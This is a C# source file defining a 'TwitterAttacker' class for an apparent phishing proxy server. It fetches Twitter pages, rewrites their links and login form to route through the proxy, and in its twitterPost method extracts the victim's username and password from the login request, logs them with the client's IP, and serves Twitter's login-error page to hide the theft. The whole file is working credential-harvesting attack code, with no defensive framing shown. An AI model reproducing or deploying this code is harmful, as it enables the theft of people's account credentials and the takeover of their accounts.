using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;

namespace ProxyServer
{
    class TwitterAttacker
    {

        public TwitterAttacker()
        {

        }

        /// <summary>
        /// Switch links in the source code of twitter.
        /// </summary>
        /// <param name="html">The html source code.</param>
        /// <param name="url">The url of the request.</param>
        /// <returns>The source code after links switch.</returns>
        public string changeLinksForTwitter(string html, string url)
        {

            string ans = html.Replace("http://", "https://localhost/url="); //  =\ wtf?

            return ans;
        }


        /// <summary>
        /// Change the form tag in the html source code of twitter.
        /// </summary>
        /// <param name="sourceCode">The source code of twitter.</param>
        /// <param name="url">The url of the request.</param>
        /// <returns>The source code after adaption.</returns>
        public string changeFormTwitter(string sourceCode, string url)
        {
            string ans = "";
            string[] linksParsing = sourceCode.Split(new string[] { "<form action=\"" }, StringSplitOptions.None);
            ans = linksParsing[0];
            ans += "<form action=\"";

            ans += "https://localhost/?url=\"www.twitter.com\"";

            linksParsing[1] = linksParsing[1].Substring(29, linksParsing[1].Length - 29);

            ans += linksParsing[1];

            return ans;

        }

        /// <summary>
        /// Deal with get request for twitter.
        /// </summary>
        /// <param name="url">The url of the request.</param>
        /// <returns>The source code of the response.</returns>
        public string handleGetForTwitter(string url)
        {
            url = url.Trim();
            if (url.StartsWith("//"))
            {
                url = "https:" + url;
            }
            else if (!url.StartsWith("http"))
            {
                url = "https://" + url;
            }

            HttpWebRequest myRequest = (HttpWebRequest)WebRequest.Create(url);

            myRequest.Method = "GET";
            WebResponse myResponse = myRequest.GetResponse();

            StreamReader sr = new StreamReader(myResponse.GetResponseStream(), System.Text.Encoding.UTF8);
            string result = sr.ReadToEnd();
            sr.Close();
            myResponse.Close();

            if (result.Contains("<!DOCTYPE html"))
                return changeLinks(result, url);
            return result;
        }

        /// <summary>
        /// The links switch method for twitter.
        /// </summary>
        /// <param name="sourceCode">The source code to be handled.</param>
        /// <param name="url">The url of the request.</param>
        /// <returns>The source code after adaption.</returns>
        public string changeLinks(string sourceCode, string url)
        {
            if (url.Equals("https://www.twitter.com"))
            {
                string code = changeLinksForTwitter(sourceCode, url);
                return changeFormTwitter(code, url);
            }
            else
                return changeLinksForTwitter(sourceCode, url);

        }

        /// <summary>
        /// Deal with twitter post request- stealing the username and password of the client.
        /// </summary>
        /// <param name="url">The url of the request.</param>
        /// <param name="serverMsg">The full request content- including the body.</param>
        /// <param name="ip">The ip of the client.</param>
        /// <returns>The source code of the error page of twitter.</returns>
        public string twitterPost(string url, string serverMsg, string ip)
        {
            string username = "";
            string password = "";
            string[] tempParamenter = serverMsg.Split(new string[] { "username_or_email" }, StringSplitOptions.None);
            username = tempParamenter[1].Substring(0, tempParamenter[1].IndexOf("&session"));
            string[] tempParamenter2 = tempParamenter[1].Split(new string[] { "password" }, StringSplitOptions.None);
            password = tempParamenter2[1].Substring(0, tempParamenter2[1].IndexOf("&remember_me"));
            username = username.Substring(username.IndexOf("=") + 1, username.Length - username.IndexOf("=") - 1);
            password = password.Substring(password.IndexOf("=") + 1, password.Length - password.IndexOf("=") - 1);

            HttpsServer.logger.twitterAttack(username, password, ip);

            return handleGetForTwitter("https://twitter.com/login/error?username_or_email=" + username);
        }

    }
}
